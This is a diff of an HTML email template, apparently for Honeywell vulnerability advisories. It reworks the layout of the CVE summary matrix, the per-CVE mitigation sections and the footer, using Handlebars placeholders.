+-                          </table>
+-                        </td>
+-                      </tr>
+-                      <tr>
+-                        <td bgcolor="#ffffff" style="background-color: #ffffff; padding: 9px 12px;">
+-                          <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"
+-                            style="width: 100%;">
+-                            <tr>
+-                              <td
+-                                style="font-size: 11px; color: #334155; mso-line-height-rule: at-least; line-height: 16px; padding-bottom: 5px;">
+-                                <strong style="color: #0f172a;">Description:</strong> {{{description}}}
+-                              </td>
+-                            </tr>
+-                            <tr>
+-                              <td
+-                                style="font-size: 11px; color: #475569; mso-line-height-rule: at-least; line-height: 15px; padding-bottom: 7px;">
+-                                <strong style="color: #0f172a;">Affected Versions:</strong> {{affected_versions}}
+-                                &nbsp;|&nbsp; <a href="{{source_url}}" target="_blank"
+-                                  style="color: #1d4ed8; font-weight: 700; text-decoration: none;">NVD Source
+-                                  &#8599;</a>
+-                              </td>
+-                            </tr>
+-                            <tr>
+-                              <td>
+-                                <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"
+-                                  bgcolor="#fffbeb"
+-                                  style="width: 100%; background-color: #fffbeb; border: 1px solid #fde68a;">
+-                                  <tr>
+-                                    <td style="padding: 7px 10px;">
+-                                      <div
+-                                        style="font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; color: #92400e; mso-line-height-rule: exactly; line-height: 14px; padding-bottom: 3px;">
+-                                        REQUIRED ACTIONS &amp; MITIGATION
+-                                      </div>
+-                                      <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"
+-                                        style="width: 100%;">
+-                                        {{#each mitigations}}
+-                                        <tr>
+-                                          <td width="12" valign="top"
+-                                            style="width: 12px; font-size: 11px; font-weight: 700; color: #92400e; mso-line-height-rule: exactly; line-height: 16px; padding-top: 1px;">
+-                                            &bull;</td>
+-                                          <td valign="top"
+-                                            style="font-size: 11px; color: #1e293b; mso-line-height-rule: exactly; line-height: 16px; padding-top: 1px;">
+-                                            {{{this}}}</td>
+-                                        </tr>
+-                                        {{/each}}
+-                                      </table>
+-                                    </td>
+-                                  </tr>
+-                                </table>
+-                              </td>
+-                            </tr>
+-                          </table>
+-                        </td>
+-                      </tr>
+-                    </table>
+-                  </td>
+-                </tr>
+-                {{/each}}
+-              </table>
+-
+-              <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0">
+-                <tr>
+-                  <td height="6" style="height: 6px; line-height: 6px; font-size: 6px;">&nbsp;</td>
+-                </tr>
+-              </table>
+-
+-              <!-- 04 HONEYWELL RECOMMENDED ACTIONS -->
+-              <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="width: 100%;">
+-                <tr>
+-                  <td bgcolor="#f1f5f9"
+-                    style="background-color: #f1f5f9; border: 1px solid #cbd5e1; padding: 7px 12px; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.7px; color: #0f172a; mso-line-height-rule: exactly; line-height: 15px;">
+-                    <span style="color: #6d28d9;">04</span> &nbsp;HONEYWELL RECOMMENDED ACTIONS
+-                  </td>
+-                </tr>
+-                <tr>
+-                  <td style="padding: 8px 4px 0 4px;">
+-                    <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"
+-                      style="width: 100%;">
+-                      {{#each honeywell_actions}}
+-                      <tr>
+-                        <td width="12" valign="top"
+-                          style="width: 12px; font-size: 11px; font-weight: 700; color: #0f172a; mso-line-height-rule: exactly; line-height: 16px; padding-top: 2px;">
+-                          &bull;</td>
+-                        <td valign="top"
+-                          style="font-size: 11px; color: #334155; mso-line-height-rule: at-least; line-height: 16px; padding-top: 2px;">
+-                          <strong style="color: #0f172a;">{{title}}:</strong> {{{detail}}}
+-                        </td>
+-                      </tr>
+-                      {{/each}}
+-                    </table>
+-                  </td>
+-                </tr>
+-              </table>
+-
+-            </td>
+-          </tr>
+-
+-          <!-- FOOTER -->
+           <tr>
+-            <td bgcolor="#f8fafc" style="background-color: #f8fafc; border-top: 1px solid #cbd5e1; padding: 11px 22px;">
+-              <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"
+-                style="width: 100%; table-layout: fixed;">
++            <td class="pad" style="padding:14px 28px;background-color:#eaf2f7;border-bottom:1px solid #dbe3ec;">
++              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0">
+                 <tr>
+-                  <td width="466" valign="middle"
+-                    style="width: 466px; font-size: 11px; color: #334155; mso-line-height-rule: exactly; line-height: 15px;">
+-                    <strong style="color: #0f172a;">{{contact_team}}:</strong>
+-                    <a href="mailto:{{contact_email}}"
+-                      style="color: #1d4ed8; font-weight: 600; text-decoration: none;">{{contact_email}}</a>
+-                  </td>
+-                  <td width="168" align="right" valign="middle"
+-                    style="width: 168px; text-align: right; font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; color: #64748b; mso-line-height-rule: exactly; line-height: 15px;">
+-                    {{tlp_classification}}
+-                  </td>
+-                </tr>
+-                <tr>
+-                  <td colspan="2"
+-                    style="padding-top: 3px; font-size: 10px; color: #64748b; mso-line-height-rule: exactly; line-height: 14px;">
+-                    This advisory ({{advisory_id}}) is compiled from vendor disclosures and vulnerability intelligence
+-                    sources. Verify environment applicability prior to deploying remediation.
+-                  </td>
++                  <td class="stack" width="25%" valign="top" style="width:25%;padding-right:8px;font-size:11px;line-height:16px;color:#526477;"><strong style="display:block;color:#172033;">ADVISORY ID</strong>{{advisory_id}}</td>
++                  <td class="stack stack-gap" width="25%" valign="top" style="width:25%;padding-right:8px;font-size:11px;line-height:16px;color:#526477;"><strong style="display:block;color:#172033;">PUBLISHED</strong>{{published_date}}</td>
++                  <td class="stack stack-gap" width="25%" valign="top" style="width:25%;padding-right:8px;font-size:11px;line-height:16px;color:#526477;"><strong style="display:block;color:#172033;">LAST MODIFIED</strong>{{updated_date}}</td>
++                  <td class="stack stack-gap" width="25%" valign="top" style="width:25%;font-size:11px;line-height:16px;color:#526477;"><strong style="display:block;color:#172033;">INVENTORY STATUS</strong>{{inventory_status}}</td>
+                 </tr>
+               </table>
+             </td>
+           </tr>
+ 
++          <tr><td class="pad" style="padding:22px 28px 8px;">
++            <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0">
++              <tr><td style="font-size:12px;line-height:17px;font-weight:bold;letter-spacing:1px;color:#075985;">01&nbsp; Executive Summary</td></tr>
++              <tr><td style="padding-top:9px;font-size:14px;line-height:22px;mso-line-height-rule: at-least;color:#263445;">
++                {{#if executive_summary}}{{{executive_summary}}}{{else}}{{#if is_single_correlation}}1 current inventory correlation.{{else}}{{correlation_count}} current inventory correlations.{{/if}} Top severity: {{top_severity_label}}. Confirm applicability and consult the vendor before remediation.{{/if}}
++              </td></tr>
++            </table>
++          </td></tr>
++
++          <tr><td class="pad" style="padding:22px 28px 8px;">
++            <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="font-size:12px;line-height:17px;font-weight:bold;letter-spacing:1px;color:#075985;">02&nbsp; Vulnerability Summary Matrix</td></tr></table>
++            <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" style="margin-top:10px;border:1px solid #cbd5e1;">
++              <tr bgcolor="#eaf2f7">
++                <th class="matrix-head" align="left" style="padding:9px 10px;border-bottom:1px solid #cbd5e1;font-size:11px;line-height:15px;color:#334155;">CVE Identifier</th>
++                <th class="matrix-head" align="left" style="padding:9px 10px;border-bottom:1px solid #cbd5e1;font-size:11px;line-height:15px;color:#334155;">Severity</th>
++                <th class="matrix-head" align="left" style="padding:9px 10px;border-bottom:1px solid #cbd5e1;font-size:11px;line-height:15px;color:#334155;">Vendor</th>
++                <th class="matrix-head" align="left" style="padding:9px 10px;border-bottom:1px solid #cbd5e1;font-size:11px;line-height:15px;color:#334155;">Affected Product</th>
++              </tr>
++              {{#each cves}}
++              <tr>
++                <td class="matrix-label" style="padding:9px 10px;border-bottom:1px solid #e2e8f0;font-size:12px;line-height:17px;"><span class="cell-label" style="display:none;">CVE Identifier: </span><a href="{{url}}" style="color:#075985;text-decoration:underline;word-break:break-word;">{{id}} &#8599;</a></td>
++                <td class="matrix-value" style="padding:9px 10px;border-bottom:1px solid #e2e8f0;font-size:12px;line-height:17px;font-weight:bold;"><span class="cell-label" style="display:none;">Severity: </span>{{#if is_critical}}<span style="color:#b42318;">CRITICAL ({{cvss_score}})</span>{{else}}{{#if is_high}}<span style="color:#b54708;">HIGH ({{cvss_score}})</span>{{else}}{{#if is_medium}}<span style="color:#8a6500;">MEDIUM ({{cvss_score}})</span>{{else}}<span style="color:#16794b;">LOW ({{cvss_score}})</span>{{/if}}{{/if}}{{/if}}</td>
++                <td class="matrix-value" style="padding:9px 10px;border-bottom:1px solid #e2e8f0;font-size:12px;line-height:17px;word-break:break-word;"><span class="cell-label" style="display:none;">Vendor: </span>{{vendor}}</td>
++                <td class="matrix-value" style="padding:9px 10px;border-bottom:1px solid #e2e8f0;font-size:12px;line-height:17px;word-break:break-word;"><span class="cell-label" style="display:none;">Affected Product: </span>{{product}}</td>
++              </tr>
++              {{/each}}
++            </table>
++          </td></tr>
++
++          <tr><td class="pad" style="padding:22px 28px 8px;">
++            <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="font-size:12px;line-height:17px;font-weight:bold;letter-spacing:1px;color:#075985;">03&nbsp; Technical Record Breakdown &amp; Required Mitigation</td></tr></table>
++            {{#each cves}}
++            <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#f8fafc" data-pdf-cve="{{id}}" data-pdf-severity="{{severity}}" style="margin-top:10px;border:1px solid #dbe3ec;background-color:#f8fafc;">
++              <tr><td style="padding:12px 14px 0;font-size:14px;line-height:20px;font-weight:bold;color:#172033;word-break:break-word;">{{id}}&nbsp; &middot;&nbsp; {{vendor}} / {{product}}</td></tr>
++              <tr><td style="padding:5px 14px 0;font-size:12px;line-height:18px;font-weight:bold;">{{#if is_critical}}<span style="color:#b42318;">CRITICAL</span>{{else}}{{#if is_high}}<span style="color:#b54708;">HIGH</span>{{else}}{{#if is_medium}}<span style="color:#8a6500;">MEDIUM</span>{{else}}<span style="color:#16794b;">LOW</span>{{/if}}{{/if}}{{/if}} &middot; {{cvss_score}}</td></tr>
++              <tr><td style="padding:10px 14px 0;font-size:12px;line-height:18px;mso-line-height-rule: at-least;color:#344256;"><strong>Description:</strong> {{{description}}}</td></tr>
++              <tr><td style="padding:8px 14px 0;font-size:12px;line-height:18px;mso-line-height-rule: at-least;color:#344256;word-break:break-word;"><strong>Affected Versions:</strong> {{affected_versions}} &nbsp;|&nbsp; <a href="{{nvd_url}}" style="color:#075985;text-decoration:underline;">NVD Source &#8599;</a></td></tr>
++              <tr><td style="padding:11px 14px 0;font-size:12px;line-height:18px;font-weight:bold;color:#172033;">Required Actions &amp; Mitigation</td></tr>
++              <tr><td style="padding:4px 14px 13px;font-size:12px;line-height:19px;mso-line-height-rule: at-least;color:#344256;">
++                {{#each mitigations}}<div style="padding-top:4px;">&#8226;&nbsp; {{{this}}}</div>{{/each}}
++              </td></tr>
++            </table>
++            {{/each}}
++          </td></tr>
++
++          <tr><td class="pad" style="padding:22px 28px 22px;">
++            <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="font-size:12px;line-height:17px;font-weight:bold;letter-spacing:1px;color:#075985;">04&nbsp; Honeywell Recommended Actions</td></tr></table>
++            <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" style="margin-top:8px;">
++              {{#each honeywell_actions}}
++              <tr><td valign="top" width="18" style="width:18px;padding:4px 0;font-size:14px;line-height:20px;color:#075985;">&#8226;</td><td style="padding:4px 0;font-size:13px;line-height:20px;color:#263445;"><strong>{{title}}:</strong> {{{detail}}}</td></tr>
++              {{/each}}
++            </table>
++          </td></tr>
++
++          <tr><td class="pad" bgcolor="#eaf2f7" style="padding:14px 28px;background-color:#eaf2f7;border-top:1px solid #cbd5e1;">
++            <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0">
++              <tr><td style="font-size:12px;line-height:18px;color:#263445;"><strong>{{#if contact_team}}{{contact_team}}{{else}}BA Security Operations{{/if}}:</strong> <a href="mailto:{{#if contact_email}}{{contact_email}}{{else}}DL-HBS-Cyber-Operations@HoneywellProd.onmicrosoft.com{{/if}}" style="color:#075985;text-decoration:underline;">{{#if contact_email}}{{contact_email}}{{else}}DL-HBS-Cyber-Operations@HoneywellProd.onmicrosoft.com{{/if}}</a></td></tr>
++              <tr><td style="padding-top:4px;font-size:11px;line-height:17px;color:#526477;">{{#if tlp_classification}}{{tlp_classification}}{{else}}TLP:AMBER // INTERNAL{{/if}}</td></tr>
++              <tr><td style="padding-top:10px;font-size:11px;line-height:17px;color:#526477;">This advisory ({{advisory_id}}) is compiled from vendor disclosures and vulnerability intelligence sources. Verify environment applicability prior to deploying remediation.</td></tr>
++            </table>
++          </td></tr>
+         </table>
+-        <!--[if mso]>
+-        </td>
+-        </tr>
+-        </table>
+-        <![endif]-->
++        <!--[if mso]></td></tr></table><![endif]-->
+       </td>
+     </tr>
+   </table>
+ </body>
+-
+ </html>
